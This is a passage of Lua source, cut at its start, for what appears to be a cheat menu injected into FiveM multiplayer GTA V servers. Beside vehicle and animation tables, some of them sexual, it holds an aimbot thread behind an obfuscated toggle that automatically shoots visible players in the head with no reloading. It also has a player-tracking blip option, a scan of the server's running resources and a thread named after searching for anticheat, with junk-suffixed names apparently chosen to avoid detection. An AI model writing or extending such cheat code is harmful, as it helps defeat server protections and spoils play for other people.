        'PROTOTIPO',
        'REAPER',
        'SC1',
        'SCRAMJET',
        'SHEAVA',
        'SULTANRS',
        'T20',
        'TAIPAN',
        'TEMPESTA',
        'TEZERACT',
        'TURISMOR',
        'TYRANT',
        'TYRUS',
        'VACCA',
        'VAGNER',
        'VIGILANTE',
        'VISIONE',
        'VOLTIC',
        'VOLTIC2',
        'XA21',
        'ZENTORNO',
    },
    ['planes'] = {
        'ALPHAZ1',
        'AVENGER',
        'AVENGER2',
        'BESRA',
        'BLIMP',
        'BLIMP2',
        'BLIMP3',
        'BOMBUSHKA',
        'CARGOPLANE',
        'CUBAN800',
        'DODO',
        'DUSTER',
        'HOWARD',
        'HYDRA',
        'JET',
        'LAZER',
        'LUXOR',
        'LUXOR2',
        'MAMMATUS',
        'MICROLIGHT',
        'MILJET',
        'MOGUL',
        'MOLOTOK',
        'NIMBUS',
        'NOKOTA',
        'PYRO',
        'ROGUE',
        'SEABREEZE',
        'SHAMAL',
        'STARLING',
        'STRIKEFORCE',
        'STUNT',
        'TITAN',
        'TULA',
        'VELUM',
        'VELUM2',
        'VESTRA',
        'VOLATOL',
    },
    ['coupes'] = {
        'COGCABRIO',
        'EXEMPLAR',
        'F620',
        'FELON',
        'FELON2',
        'JACKAL',
        'ORACLE',
        'ORACLE2',
        'SENTINEL',
        'SENTINEL2',
        'WINDSOR',
        'WINDSOR2',
        'ZION',
        'ZION2',
    },
    ['vans'] = {
        'BISON',
        'BISON2',
        'BISON3',
        'BOBCATXL',
        'BOXVILLE',
        'BOXVILLE2',
        'BOXVILLE3',
        'BOXVILLE4',
        'BOXVILLE5',
        'BURRITO',
        'BURRITO2',
        'BURRITO3',
        'BURRITO4',
        'BURRITO5',
        'CAMPER',
        'GBURRITO',
        'GBURRITO2',
        'JOURNEY',
        'MINIVAN',
        'MINIVAN2',
        'PARADISE',
        'PONY',
        'PONY2',
        'RUMPO',
        'RUMPO2',
        'RUMPO3',
        'SPEEDO',
        'SPEEDO2',
        'SPEEDO4',
        'SURFER',
        'SURFER2',
        'TACO',
        'YOUGA',
        'YOUGA2',
    },
    ['service'] = {
        'AIRBUS',
        'BRICKADE',
        'BUS',
        'COACH',
        'PBUS2',
        'RALLYTRUCK',
        'RENTALBUS',
        'TAXI',
        'TOURBUS',
        'TRASH',
        'TRASH2',
        'WASTELANDER',
        'AMBULANCE',
        'FBI',
        'FBI2',
        'FIRETRUK',
        'LGUARD',
        'PBUS',
        'POLICE',
        'POLICE2',
        'POLICE3',
        'POLICE4',
        'POLICEB',
        'POLICEOLD1',
        'POLICEOLD2',
        'POLICET',
        'POLMAV',
        'PRANGER',
        'PREDATOR',
        'RIOT',
        'RIOT2',
        'SHERIFF',
        'SHERIFF2',
        'APC',
        'BARRACKS',
        'BARRACKS2',
        'BARRACKS3',
        'BARRAGE',
        'CHERNOBOG',
        'CRUSADER',
        'HALFTRACK',
        'KHANJALI',
        'RHINO',
        'SCARAB',
        'SCARAB2',
        'SCARAB3',
        'THRUSTER',
        'TRAILERSMALL2',
    },
    ['suvs'] = {
        'BALLER',
        'BALLER2',
        'BALLER3',
        'BALLER4',
        'BALLER5',
        'BALLER6',
        'BJXL',
        'CAVALCADE',
        'CAVALCADE2',
        'CONTENDER',
        'DUBSTA',
        'DUBSTA2',
        'FQ2',
        'GRANGER',
        'GRESLEY',
        'HABANERO',
        'HUNTLEY',
        'LANDSTALKER',
        'MESA',
        'MESA2',
        'PATRIOT',
        'PATRIOT2',
        'RADI',
        'ROCOTO',
        'SEMINOLE',
        'SERRANO',
        'TOROS',
        'XLS',
        'XLS2',
    },
    ['industrial'] = {
        'BULLDOZER',
        'CUTTER',
        'DUMP',
        'FLATBED',
        'GUARDIAN',
        'HANDLER',
        'MIXER',
        'MIXER2',
        'RUBBLE',
        'TIPTRUCK',
        'TIPTRUCK2',
    },
    ['helicopters'] = {
        'AKULA',
        'ANNIHILATOR',
        'BUZZARD',
        'BUZZARD2',
        'CARGOBOB',
        'CARGOBOB2',
        'CARGOBOB3',
        'CARGOBOB4',
        'FROGGER',
        'FROGGER2',
        'HAVOK',
        'HUNTER',
        'MAVERICK',
        'POLMAV',
        'SAVAGE',
        'SEASPARROW',
        'SKYLIFT',
        'SUPERVOLITO',
        'SUPERVOLITO2',
        'SWIFT',
        'SWIFT2',
        'VALKYRIE',
        'VALKYRIE2',
        'VOLATUS',
    },
    ['boats'] = {
        'DINGHY',
        'DINGHY2',
        'DINGHY3',
        'DINGHY4',
        'JETMAX',
        'MARQUIS',
        'PREDATOR',
        'SEASHARK',
        'SEASHARK2',
        'SEASHARK3',
        'SPEEDER',
        'SPEEDER2',
        'SQUALO',
        'SUBMERSIBLE',
        'SUBMERSIBLE2',
        'SUNTRAP',
        'TORO',
        'TORO2',
        'TROPIC',
        'TROPIC2',
        'TUG',
    },
    ['sedans'] = {
        'ASEA',
        'ASEA2',
        'ASTEROPE',
        'COG55',
        'COG552',
        'COGNOSCENTI',
        'COGNOSCENTI2',
        'EMPEROR',
        'EMPEROR2',
        'EMPEROR3',
        'FUGITIVE',
        'GLENDALE',
        'INGOT',
        'INTRUDER',
        'LIMO2',
        'PREMIER',
        'PRIMO',
        'PRIMO2',
        'REGINA',
        'ROMERO',
        'SCHAFTER2',
        'SCHAFTER5',
        'SCHAFTER6',
        'STAFFORD',
        'STANIER',
        'STRATUM',
        'STRETCH',
        'SUPERD',
        'SURGE',
        'TAILGATER',
        'WARRENER',
        'WASHINGTON',
    },
    ['muscle'] = {
        'BLADE',
        'BUCCANEER',
        'BUCCANEER2',
        'CHINO',
        'CHINO2',
        'CLIQUE',
        'COQUETTE3',
        'DEVIANT',
        'DOMINATOR',
        'DOMINATOR2',
        'DOMINATOR3',
        'DOMINATOR4',
        'DOMINATOR5',
        'DOMINATOR6',
        'DUKES',
        'DUKES2',
        'ELLIE',
        'FACTION',
        'FACTION2',
        'FACTION3',
        'GAUNTLET',
        'GAUNTLET2',
        'HERMES',
        'HOTKNIFE',
        'HUSTLER',
        'IMPALER',
        'IMPALER2',
        'IMPALER3',
        'IMPALER4',
        'IMPERATOR',
        'IMPERATOR2',
        'IMPERATOR3',
        'LURCHER',
        'MOONBEAM',
        'MOONBEAM2',
        'NIGHTSHADE',
        'PHOENIX',
        'PICADOR',
        'RATLOADER',
        'RATLOADER2',
        'RUINER',
        'RUINER2',
        'RUINER3',
        'SABREGT',
        'SABREGT2',
        'SLAMVAN',
        'SLAMVAN2',
        'SLAMVAN3',
        'SLAMVAN4',
        'SLAMVAN5',
        'SLAMVAN6',
        'STALION',
        'STALION2',
        'TAMPA',
        'TAMPA3',
        'TULIP',
        'VAMOS',
        'VIGERO',
        'VIRGO',
        'VIRGO2',
        'VIRGO3',
        'VOODOO',
        'VOODOO2',
        'YOSEMITE',
    },
}

local VehicleInitializedwqqdqd = function()
    for k, v in pairs(vehicles) do
        table.insert(Objects[17], {
            ['Text'] = k,
            ['Type'] = 'list',
            ['Items'] = v,
            ['Current'] = 1,
            ['cb'] = SpawnVehicle,
        })
    end

    table.insert(Objects[17], {
        ['Text'] = 'Back',
        ['Type'] = 'menu',
        ['Menu'] = 12,
    })
end

local WeatherThread00sdascd = function()
    while true do
        if Toggles['Lock time'] then
            NetworkOverrideClockTime(hourlocked, 0, 0)
        end
        if Toggles['Lock weather'] then
            ClearOverrideWeather()
            ClearWeatherTypePersist()
            SetWeatherTypePersist(weatherlocked)
            SetWeatherTypeNow(weatherlocked)
            SetWeatherTypeNowPersist(weatherlocked)
            if weatherlocked == 'XMAS' then
                SetForceVehicleTrails(true)
                SetForcePedFootstepsTracks(true)
            else
                SetForceVehicleTrails(false)
                SetForcePedFootstepsTracks(false)
            end
        end
        Wait(0)
    end
end

local BlipsThread00sacascac = function()
    while true do

        if Toggles['PlayerBlips'] then
            PlayerBlips({
                ['Enabled'] = Toggles['PlayerBlips']
            })
        end

        Wait(10000)
    end
end

local WeaponThread00asdascac = function()
    while true do
        local sleep, me = 250, PlayerPedId()
        if Toggles['§þïñßð†'] then
            sleep = 0

            if IsPedArmed(me, 6) then
                for k, v in pairs(allplayers) do
                    Wait(0)
                    local target = GetPlayerPed(v)
                    if DoesEntityExist(target) and target ~= me then
                        if not IsPedDeadOrDying(target) and not IsPedFatallyInjured(target) then
                            local target_pos = GetEntityCoords(target)
                            local OnScreen, ScreenX, ScreenY = World3dToScreen2d(target_pos.x, target_pos.y, target_pos.z, 0)
                            if IsEntityVisible(target) and OnScreen and HasEntityClearLosToEntity(me, target, 17) then
                                ShootAtCoord(GetPedBoneCoords(target, 31086, 0, 0, 0))
                                PedSkipNextReloading(me)
                            end
                        end
                    end
                end
            end
        end
        Wait(sleep)
    end
end

local TogglesThread00dssdvsd = function()
    while true do
        local sleep = 250
        if Toggles['Show toggles'] then
            sleep = 0
            local offs = 0.0
            for k, v in pairs(Toggles) do
                if v then
                    if k ~= 'Show toggles' then
                        if type(v) ~= 'boolean' then
                            DrawTxt(k .. ' [' .. v .. ']', 0.0 + offs, true, nil, 0.25, 0.9, false, 0.1)
                        else
                            DrawTxt(k, 0.0 + offs, true, nil, 0.25, 0.9, false, 0.1)
                        end
                        offs = offs + 0.015
                    end
                end
            end
        end
        Wait(sleep)
    end
end

animations = {
    ["Smoke"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_SMOKING",
    },
    ["Musician"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_MUSICIAN",
    },
    ["Dj"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@mp_player_intcelebrationmale@dj",
        ["Anim"] = "dj",
        ["Flag"] = 0,
    },
    ["Coffee"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_DRINKING",
    },
    ["Beer"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_PARTYING",
    },
    ["Air Guitar"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@mp_player_intcelebrationmale@air_guitar",
        ["Anim"] = "air_guitar",
        ["Flag"] = 0,
    },
    ["Air Shagging"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@mp_player_intcelebrationfemale@air_shagging",
        ["Anim"] = "air_shagging",
        ["Flag"] = 0,
    },
    ["Rock'n'roll"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_player_int_upperrock",
        ["Anim"] = "mp_player_int_rock",
        ["Flag"] = 0,
    },
    ["Drunk Standing"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_bum_standing@drunk@idle_a",
        ["Anim"] = "idle_a",
        ["Flag"] = 0,
    },
    ["Vomiting"] = {
        ["Type"] = "animation",
        ["Dict"] = "oddjobs@taxi@tie",
        ["Anim"] = "vomit_outside",
        ["Flag"] = 0,
    },
    ["Hello"] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_hello",
        ["Flag"] = 0,
    },
    ["Birk"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_common",
        ["Anim"] = "givetake1_a",
        ["Flag"] = 0,
    },
    ["Handshake"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_ped_interaction",
        ["Anim"] = "handshake_guy_a",
        ["Flag"] = 0,
    },
    ["Hugging"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_ped_interaction",
        ["Anim"] = "hugs_guy_a",
        ["Flag"] = 0,
    },
    ["Salute"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_player_int_uppersalute",
        ["Anim"] = "mp_player_int_salute",
        ["Flag"] = 0,
    },
    ["Suspect : Surrender"] = {
        ["Type"] = "animation",
        ["Dict"] = "random@arrests@busted",
        ["Anim"] = "idle_c",
        ["Flag"] = 0,
    },
    ["Fishing"] = {
        ["Type"] = "scenario",
        ["Anim"] = "world_human_stand_fishing",
    },
    ["Police : Investigate"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@code_human_police_investigate@idle_b",
        ["Anim"] = "idle_f",
        ["Flag"] = 0,
    },
    ["Police : Use Radio"] = {
        ["Type"] = "animation",
        ["Dict"] = "random@arrests",
        ["Anim"] = "generic_radio_chatter",
        ["Flag"] = 0,
    },
    ["Police : Traffic"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_CAR_PARK_ATTENDANT",
    },
    ["Police : Binoculars"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_BINOCULARS",
    },
    ["Agriculture : Planting"] = {
        ["Type"] = "scenario",
        ["Anim"] = "world_human_gardener_plant",
    },
    ["Mechanic : Fixing Motor"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@repair",
        ["Anim"] = "fixing_a_ped",
        ["Flag"] = 0,
    },
    ["Medic : Kneel"] = {
        ["Type"] = "scenario",
        ["Anim"] = "CODE_HUMAN_MEDIC_KNEEL",
    },
    ["Taxi : Talk to customer"] = {
        ["Type"] = "animation",
        ["Dict"] = "oddjobs@taxi@driver",
        ["Anim"] = "leanover_idle",
        ["Flag"] = 0,
    },
    ["Taxi : Give bill"] = {
        ["Type"] = "animation",
        ["Dict"] = "oddjobs@taxi@cyi",
        ["Anim"] = "std_hand_off_ps_passenger",
        ["Flag"] = 0,
    },
    ["Grocer : Give"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_am_hold_up",
        ["Anim"] = "purchase_beerbox_shopkeeper",
        ["Flag"] = 0,
    },
    ["Barman : Serve Shot"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@drinking",
        ["Anim"] = "shots_barman_b",
        ["Flag"] = 0,
    },
    ["Journalist : Take Photos"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_PAPARAZZI",
    },
    ["All Jobs : Clipboard"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_CLIPBOARD",
    },
    ["All Jobs : Hammering"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_HAMMERING",
    },
    ["Bum : Holding Sign"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_BUM_FREEWAY",
    },
    ["Bum : Human Statue"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_HUMAN_STATUE",
    },
    ["Cheering"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_CHEERING",
    },
    ["Super"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_action",
        ["Anim"] = "thanks_male_06",
        ["Flag"] = 0,
    },
    ["Point"] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_point",
        ["Flag"] = 0,
    },
    ["Come here"] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_come_here_soft",
        ["Flag"] = 0,
    },
    ["Bring it on"] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_bring_it_on",
        ["Flag"] = 0,
    },
    ["Me"] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_me",
        ["Flag"] = 0,
    },
    ["I knew it"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@am_hold_up@male",
        ["Anim"] = "shoplift_high",
        ["Flag"] = 0,
    },
    ["Exhausted"] = {
        ["Type"] = "scenario",
        ["Anim"] = "idle_d",
    },
    ["I'm the shit"] = {
        ["Type"] = "scenario",
        ["Anim"] = "idle_a",
    },
    ["Facepalm"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@mp_player_intcelebrationmale@face_palm",
        ["Anim"] = "face_palm",
        ["Flag"] = 0,
    },
    ["Calm down "] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_easy_now",
        ["Flag"] = 0,
    },
    ["What did I do?"] = {
        ["Type"] = "animation",
        ["Dict"] = "oddjobs@assassinate@multi@",
        ["Anim"] = "react_big_variations_a",
        ["Flag"] = 0,
    },
    ["Fear"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@code_human_cower_stand@male@react_cowering",
        ["Anim"] = "base_right",
        ["Flag"] = 0,
    },
    ["Fight ?"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@deathmatch_intros@unarmed",
        ["Anim"] = "intro_male_unarmed_e",
        ["Flag"] = 0,
    },
    ["It's not possible !"] = {
        ["Type"] = "animation",
        ["Dict"] = "gestures@m@standing@casual",
        ["Anim"] = "gesture_damn",
        ["Flag"] = 0,
    },
    ["Embrace"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_ped_interaction",
        ["Anim"] = "kisses_guy_a",
        ["Flag"] = 0,
    },
    ["Finger of honor"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_player_int_upperfinger",
        ["Anim"] = "mp_player_int_finger_01_enter",
        ["Flag"] = 0,
    },
    ["You wanker"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_player_int_upperwank",
        ["Anim"] = "mp_player_int_wank_01",
        ["Flag"] = 0,
    },
    ["Bullet in the head"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_suicide",
        ["Anim"] = "pistol",
        ["Flag"] = 0,
    },
    ["Flex muscles"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_muscle_flex@arms_at_side@base",
        ["Anim"] = "base",
        ["Flag"] = 0,
    },
    ["Lift weights"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_muscle_free_weights@male@barbell@base",
        ["Anim"] = "base",
        ["Flag"] = 0,
    },
    ["Do push ups"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_push_ups@male@base",
        ["Anim"] = "base",
        ["Flag"] = 0,
    },
    ["Do sit ups"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_sit_ups@male@base",
        ["Anim"] = "base",
        ["Flag"] = 0,
    },
    ["Do yoga"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_yoga@male@base",
        ["Anim"] = "base_a",
        ["Flag"] = 0,
    },
    ["Drink coffee"] = {
        ["Type"] = "animation",
        ["Dict"] = "amb@world_human_aa_coffee@idle_a",
        ["Anim"] = "idle_a",
        ["Flag"] = 0,
    },
    ["Sit"] = {
        ["Type"] = "animation",
        ["Dict"] = "anim@heists@prison_heistunfinished_biztarget_idle",
        ["Anim"] = "target_idle",
        ["Flag"] = 0,
    },
    ["Lean against wall"] = {
        ["Type"] = "scenario",
        ["Anim"] = "world_human_leaning",
    },
    ["Sunbathe Back"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_SUNBATHE_BACK",
    },
    ["Sunbathe Front"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_SUNBATHE",
    },
    ["Clean"] = {
        ["Type"] = "scenario",
        ["Anim"] = "world_human_maid_clean",
    },
    ["BBQ"] = {
        ["Type"] = "scenario",
        ["Anim"] = "PROP_HUMAN_BBQ",
    },
    ["Search"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@prostitutes@sexlow_veh",
        ["Anim"] = "low_car_bj_to_prop_female",
        ["Flag"] = 0,
    },
    ["Take selfie"] = {
        ["Type"] = "scenario",
        ["Anim"] = "world_human_tourist_mobile",
    },
    ["Listen to wall/door"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@safe_cracking",
        ["Anim"] = "idle_base",
        ["Flag"] = 0,
    },
    ["Normal M"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@confident",
    },
    ["Normal F"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_f@heels@c",
    },
    ["Depressed male"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@depressed@a",
    },
    ["Depressed female"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_f@depressed@a",
    },
    ["Business"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@business@a",
    },
    ["Determined"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@brave@a",
    },
    ["Casual"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@casual@a",
    },
    ["Ate too much"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@fat@a",
    },
    ["Hipster"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@hipster@a",
    },
    ["Injured"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@injured",
    },
    ["In a hurry"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@hurry@a",
    },
    ["Hobo"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@hobo@a",
    },
    ["sad"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@sad@a",
    },
    ["Muscle"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@muscle@a",
    },
    ["Shocked"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@shocked@a",
    },
    ["Being shady"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@shadyped@a",
    },
    ["Buzzed"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@buzzed",
    },
    ["Hurry"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@hurry_butch@a",
    },
    ["Proud"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@money",
    },
    ["Short race"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_m@quick",
    },
    ["Man eater"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_f@maneater",
    },
    ["Sassy"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_f@sassy",
    },
    ["Arrogant"] = {
        ["Type"] = "walking_style",
        ["Anim"] = "move_f@arrogant@a",
    },
    ["Man receiving in car"] = {
        ["Type"] = "animation",
        ["Dict"] = "oddjobs@towing",
        ["Anim"] = "m_blow_job_loop",
        ["Flag"] = 0,
    },
    ["Woman giving in car"] = {
        ["Type"] = "animation",
        ["Dict"] = "oddjobs@towing",
        ["Anim"] = "f_blow_job_loop",
        ["Flag"] = 0,
    },
    ["Man on bottom in car"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@prostitutes@sexlow_veh",
        ["Anim"] = "low_car_sex_loop_player",
        ["Flag"] = 0,
    },
    ["Woman on top in car"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@prostitutes@sexlow_veh",
        ["Anim"] = "low_car_sex_loop_female",
        ["Flag"] = 0,
    },
    ["Scratch nuts"] = {
        ["Type"] = "animation",
        ["Dict"] = "mp_player_int_uppergrab_crotch",
        ["Anim"] = "mp_player_int_grab_crotch",
        ["Flag"] = 0,
    },
    ["Hooker 1"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@strip_club@idles@stripper",
        ["Anim"] = "stripper_idle_02",
        ["Flag"] = 0,
    },
    ["Hooker 2"] = {
        ["Type"] = "scenario",
        ["Anim"] = "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS",
    },
    ["Hooker 3"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@strip_club@backroom@",
        ["Anim"] = "stripper_b_backroom_idle_b",
        ["Flag"] = 0,
    },
    ["Strip Tease 1"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@strip_club@lap_dance@ld_girl_a_song_a_p1",
        ["Anim"] = "ld_girl_a_song_a_p1_f",
        ["Flag"] = 0,
    },
    ["Strip Tease 2"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@strip_club@private_dance@part2",
        ["Anim"] = "priv_dance_p2",
        ["Flag"] = 0,
    },
    ["Stip Tease On Knees"] = {
        ["Type"] = "animation",
        ["Dict"] = "mini@strip_club@private_dance@part3",
        ["Anim"] = "priv_dance_p3",
        ["Flag"] = 0,
    },
}

CreateThread(function()
    interactsoundaudios = {}
    local files = {
        '__resource.lua',
        'fxmanifest.lua',
    }  

    local findLast = function(haystack, needle)
        local i = haystack:match(".*" .. needle .. "()")
        if i == nil then 
            return nil 
        else 
            return i - 1 
        end
    end

    for i = 0, GetNumResources() - 1 do
        if GetResourceState(GetResourceByFindIndex(i)) == 'started' then
            for k, v in pairs(files) do
                local text = LoadResourceFile(GetResourceByFindIndex(i), v)
                if text then
                    if string.find((text):lower(), ('InteractSound by Scott'):lower(), 1, true) then
                        for str in text:gmatch("[^\r\n]+") do
                            local s, e = str:find('.ogg')
                            if s and e then
                                if not str:find('--', 1, true) then
                                    text = str:sub(findLast(str, '/'), s)
                                    print('Found interactsound: ^1'.. text:sub(2, #text - 1))
                                    table.insert(interactsoundaudios, text:sub(2, #text - 1))
                                    HasInteractSound = true
                                end
                            end
                        end
                    end
                end
            end
        end
    end

    if #interactsoundaudios == 0 then
        interactsoundaudios = {'no sounds'}
    else
        for k, v in pairs(Objects) do
            for k, v in pairs(v) do
                if v['Text'] == 'Play on all' or v['Text'] == 'Play sound on player' then
                    v['Items'] = interactsoundaudios
                end
            end
        end
    end
end)

local Loaded00qwdqwdq = function()
       local dui = GetDuiHandle(CreateDui('https://media.discordapp.net/attachments/837292513428504577/843293889389789204/Baslksz-1.jpg', 2000, 1157))
    CreateRuntimeTextureFromDuiHandle(CreateRuntimeTxd('wave'), 'logo', dui)

    PlaySoundFromEntity(-1, 'HACKING_DOWNLOADED', PlayerPedId(), 0, 0, 0)
    Wait(1500)
    StopSound()
    local HasOpened00wqdqd = false

    for i = 1, 255 / 2 do
        if not menuvisiblewdqdq and not HasOpened00wqdqd then
            AddTextEntry(GetCurrentResourceName(), '~INPUT_REPLAY_CAMERAUP~ ~g~Open menu')
            DisplayHelpTextThisFrame(GetCurrentResourceName(), false)
        else
            HasOpened00wqdqd = true
        end

        local alpha = math.floor(255 - i * 2)
		local timer = GetGameTimer() + 30
    while timer >= GetGameTimer() do
        DrawSprite('wave', 'logo', 0.5, 0.5, 1.35, 1.35, 0, 255, 255, 255, alpha)
        Wait(0)
    end
end

    while not menuvisiblewdqdq and not HasOpened00wqdqd do
        AddTextEntry(GetCurrentResourceName(), '~INPUT_REPLAY_CAMERAUP~ ~g~Open Menu')
        DisplayHelpTextThisFrame(GetCurrentResourceName(), false)

        Wait(0)
    end

    StopSound()
end

local Loaded01qwdqwdq = function()
    local HasOpened01wqdqd = true
local dui1 = GetDuiHandle(CreateDui('https://i.imgur.com/hw4i2Vq.gif', 912, 242))
CreateRuntimeTextureFromDuiHandle(CreateRuntimeTxd('wave1'), 'logo1', dui1)
local alpha = math.floor(255 - i * 2)
local timer = GetGameTimer() 
while timer >= GetGameTimer() do
Wait(0)
end
end


CreateThread(VehicleInitializedwqqdqd)
CreateThread(Menu00wqdqdqwd)
CreateThread(Loaded00qwdqwdq)
CreateThread(Loaded01qwdqwdq)
CreateThread(ESXCode00dqwfqefw)
CreateThread(SearchAnticheat00dffwfewef)
CreateThread(PlayerUpdate00qwdqwdqd)
CreateThread(AutoDrive00sacfsadfc)
CreateThread(WeatherThread00sdascd)
CreateThread(BlipsThread00sacascac)
CreateThread(WeaponThread00asdascac)
CreateThread(TogglesThread00dssdvsd)